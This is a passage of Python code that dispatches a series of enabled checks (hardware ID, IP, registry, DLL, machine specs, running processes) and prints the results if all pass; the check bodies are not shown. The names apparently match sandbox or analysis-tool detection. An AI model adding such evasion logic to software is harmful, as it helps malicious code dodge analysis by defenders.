            checks_failed = True
    if checks_config[5]["enabled"]:
        result = hwid_check()
        results.append(("hwid_check", result))
        if not result:
            checks_failed = True
    if checks_config[6]["enabled"]:
        result = ip_check()
        results.append(("ip_check", result))
        if not result:
            checks_failed = True
    if checks_config[7]["enabled"]:
        result = registry_check()
        results.append(("registry_check", result))
        if not result:
            checks_failed = True
    if checks_config[8]["enabled"]:
        result = dll_check()
        results.append(("dll_check", result))
        if not result:
            checks_failed = True
    if checks_config[9]["enabled"]:
        result = specs_check()
        results.append(("specs_check", result))
        if not result:
            checks_failed = True
    if checks_config[10]["enabled"]:
        result = process_check()
        results.append(("process_check", result))
        if not result:
            checks_failed = True


    if not checks_failed:
        for check_name, result in results:
            print(f"{check_name}: {result}")

if __name__ == "__main__":
    run_checks()
